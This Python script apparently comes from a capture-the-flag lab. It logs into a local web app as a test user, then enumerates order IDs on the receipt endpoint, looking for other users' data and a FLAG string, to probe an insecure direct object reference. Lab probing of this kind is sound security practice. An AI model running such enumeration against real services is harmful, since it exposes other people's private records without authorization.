import requests
import re

# Target base URL
BASE_URL = "http://127.0.0.1:32780"

# Initialize session
session = requests.Session()

print("[*] Authenticating...")

# Authenticate
session.post(f"{BASE_URL}/", data={"username": "test"})
auth_response = session.post(
    f"{BASE_URL}/password/test",
    data={"username": "test", "user_id": "10032", "password": "test"}
)

print(f"[+] Auth status: {auth_response.status_code}")
print(f"[+] Session cookies: {dict(session.cookies)}\n")

# Sample a few order IDs to see what responses look like
print("[*] Sampling order IDs to analyze response patterns...\n")

sample_ids = [300000, 300050, 300100, 300150, 300200, 300250, 300300, 300350, 300400, 300450, 300500]

for order_id in sample_ids:
    response = session.get(f"{BASE_URL}/order/{order_id}/receipt")
    
    print(f"[*] Order ID {order_id}:")
    print(f"    Status: {response.status_code}")
    print(f"    Content-Length: {len(response.text)}B")
    print(f"    Content-Type: {response.headers.get('Content-Type', 'N/A')}")
    
    # Check for redirects
    if response.history:
        print(f"    Redirects: {[r.status_code for r in response.history]}")
    
    # Show response content (truncated if long)
    if len(response.text) > 0:
        content_preview = response.text[:300].replace('\n', ' ')
        print(f"    Content: {content_preview}")
        
        # Check for FLAG
        if 'FLAG{' in response.text:
            print(f"    [!!!] FLAG FOUND: {re.search(r'FLAG\\{[^}]+\\}', response.text).group(0)}")
    else:
        print(f"    Content: [EMPTY]")
    
    print()

# Let's also check if we need to be authenticated as a different user
# or if there's an issue with the authentication
print("[*] Checking authentication state...")
profile_check = session.get(f"{BASE_URL}/profile")
print(f"[*] Profile check: Status {profile_check.status_code}")
print(f"    Content: {profile_check.text[:500]}")

